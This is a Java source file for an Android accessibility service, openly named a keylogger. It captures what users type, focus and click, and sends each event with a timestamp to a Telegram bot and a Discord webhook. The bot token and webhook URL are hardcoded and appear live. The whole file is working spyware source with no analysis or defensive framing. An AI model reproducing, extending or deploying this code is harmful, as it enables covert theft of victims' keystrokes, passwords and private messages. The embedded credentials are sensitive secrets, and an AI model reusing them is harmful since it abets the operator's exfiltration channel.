package com.bshu2.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.os.AsyncTask;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.example.dynamicapk.Constants; // Importing the Constants class

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

/**
 * Keylogger Service for logging accessibility events and sending data to Telegram and Discord.
 */
public class Keylogger extends AccessibilityService {

    private static final String TELEGRAM_BOT_TOKEN = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI";
    private static final String DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1193056692171178095/IqlnHSr8jODI0qaIYeAmaWWyK1mvg0uRPKl32BHaoX7S3ami8G4V4DqHy4qoqMrImBGN";

    private static final String TAG = "Keylogger";

    private class SendToTelegramTask extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            try {
                String message = params[0];
                String chatId = Constants.TELEGRAM_CHAT_ID; // Retrieve chat ID dynamically
                String telegramUrl = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
                String payload = "chat_id=" + chatId + "&text=" + message.replace(" ", "+");

                URL url = new URL(telegramUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.getBytes("UTF-8"));
                    os.flush();
                }

                Log.d(TAG, "Telegram Response Code: " + conn.getResponseCode());
            } catch (Exception e) {
                Log.e(TAG, "Error sending message to Telegram", e);
            }
            return null;
        }
    }

    private class SendToDiscordTask extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            try {
                String message = params[0];
                String payload = "{\"content\": \"" + message.replace("\"", "\\\"") + "\"}";

                URL url = new URL(DISCORD_WEBHOOK_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.getBytes("UTF-8"));
                    os.flush();
                }

                Log.d(TAG, "Discord Response Code: " + conn.getResponseCode());
            } catch (Exception e) {
                Log.e(TAG, "Error sending message to Discord", e);
            }
            return null;
        }
    }

    @Override
    public void onServiceConnected() {
        Log.d(TAG, "Keylogger service connected.");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String timestamp = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)
                .format(Calendar.getInstance().getTime());
        String data = event.getText().toString();

        if (data == null || data.trim().isEmpty()) {
            return;
        }

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String logMessage = timestamp + " | (TEXT_CHANGED) | " + data;
                new SendToTelegramTask().execute(logMessage);
                new SendToDiscordTask().execute(logMessage);
                Log.d(TAG, "Logged event: " + logMessage);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String logMessage = timestamp + " | (FOCUSED) | " + data;
                new SendToTelegramTask().execute(logMessage);
                new SendToDiscordTask().execute(logMessage);
                Log.d(TAG, "Logged event: " + logMessage);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String logMessage = timestamp + " | (CLICKED) | " + data;
                new SendToTelegramTask().execute(logMessage);
                new SendToDiscordTask().execute(logMessage);
                Log.d(TAG, "Logged event: " + logMessage);
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted.");
    }
}
